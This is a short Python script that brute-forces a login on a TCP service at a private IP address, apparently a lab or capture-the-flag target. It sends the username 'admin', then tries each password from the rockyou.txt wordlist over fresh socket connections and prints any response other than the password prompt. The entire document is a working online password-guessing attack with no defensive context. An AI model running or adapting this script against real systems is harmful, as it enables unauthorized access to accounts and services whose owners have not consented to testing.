import socket

IP='10.10.88.124'
PORT=8000

PASSWORDS_PATH="/usr/share/wordlists/rockyou.txt"

with open(PASSWORDS_PATH,"r") as fd:
    password=fd.readline()
    while password:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP,PORT))
            s.sendall(b'admin')
            data=s.recv(1024)
            #print(data)
            print(password.encode("utf-8"))
            s.sendall(password.encode("utf-8"))
            data=s.recv(1024)
            if data==b'Password:\n':
                print("Fail")
            else:
                print(data)
            s.close()
        password=fd.readline()
